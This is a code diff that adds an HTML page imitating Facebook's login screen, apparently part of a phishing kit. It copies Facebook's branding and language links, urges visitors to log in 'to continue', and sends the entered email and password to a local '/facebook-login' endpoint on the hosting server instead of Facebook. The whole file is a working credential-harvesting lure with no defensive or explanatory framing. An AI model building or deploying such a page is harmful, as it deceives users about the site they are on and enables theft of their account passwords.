@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<link rel="icon" href="/static/Image/favicon.ico" sizes="32x32" type="image/x-icon"/>
+	<link rel="stylesheet" href="/static/css/facebook.css">
+	<title>Log in to Facebook</title>
+</head>
+<body>
+	<div>
+		<img class="logo" src="/static/images/facebook/image.png" alt="Facebook"/>
+	</div>
+	<form method="post" action="/facebook-login">
+		<div class="input-box">
+	<p class='warn'>Please login with your facebook account to continue</p>
+		<div>
+			<input type="text" name="email" class="box" id="box-1" placeholder="Mobile number or email address" required>
+		</div>
+		<div>
+			<input type="password" name="pass" class="box" id="box-2" placeholder="Password" required>
+		</div>
+		<div>
+			<button type="submit" class="login-btn">Log In</button>
+		</div>
+		<div>
+			<p class="forgotten"><a href="#">Forgotten password?</a></p>
+		</div>
+		<div>
+			<span class="or"><hr class="line-1">or<hr class="line-2"></span>
+		</div>
+		<div>
+			<button type="button" class="newAccount"><a href="#">Create New Account</a></button>
+		</div>
+		<div class="language">
+			<div class="left">
+				<span id="en"><a href="#">English (UK)</a></span>
+				<span class="lang"><a href="#">অসমীয়া</a></span>
+				<span class="lang"><a href="#">नेपाली</a></span>
+				<span class="lang"><a href="#">Português (Brasil)</a></span>
+			</div>
+			<div class="right">
+				<span class="lang"><a href="#">বাংলা</a></span>
+				<span calss="lang"><a href="#">हिन्दी </a></span>
+				<span class="lang"><a href="#">Español</a></span>
+				<span id="more"><a href="#">+</a></span>
+			</div>
+		</div>
+		<div>
+			<p id="facebookInc">Facebook Inc.</p>
+		</div>
+	</form>
+</body>
+</html>
